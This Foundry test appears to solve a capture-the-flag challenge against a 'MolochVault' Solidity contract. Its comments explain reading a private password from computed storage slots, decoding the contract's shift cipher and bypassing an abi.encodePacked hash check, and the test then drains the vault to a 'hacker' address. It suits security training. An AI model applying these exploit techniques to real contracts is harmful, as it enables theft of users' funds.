// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/MolochVault.sol";

contract MolochHack is Test {
    MOLOCH_VAULT moloch;
    address hacker = makeAddr("hacker");

    /*
        1. Detailed formula for finding slot of dynamic struct :
            keccak256(abi.encodePacked(slot))) + index
            slot for `cabals` start at 3, index for `password` at 3rd struck is 5, so storage at "0xC2575A0E9E593C00F959F8C92F12DB2869C3395A3B0502D05E2516446F71F860"
            containing string "ZJQQBW*NFCPKCAKQR"
        2. Details of decrypting Moloch-algorithm
            Moloch-algorithm transform preimage with shifting +2 for vowels and -2 for consonants 
        3. Explain bypass for keccak256(abi.encodepacked()).
            instead of putting `question` array value in separate array element, putting it in single element and keep empty the other element

        run forge test --match-contract MolochHack --fork-url <url> --fork-block-number 8647694 -vvvv
    */

    function setUp() public {
        moloch = MOLOCH_VAULT(
            payable(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f)
        );
        deal(address(this), 1 wei);
    }

    fallback() external payable {
        payable(msg.sender).transfer(2);
    }

    function testhack() public {
        moloch.uhER778(["BLOODY PHARMACIST", "WHO DO YOUSERVE?", ""]);
        moloch.sendGrant(payable(hacker));
        assertEq(hacker.balance, 1 wei);
    }
}
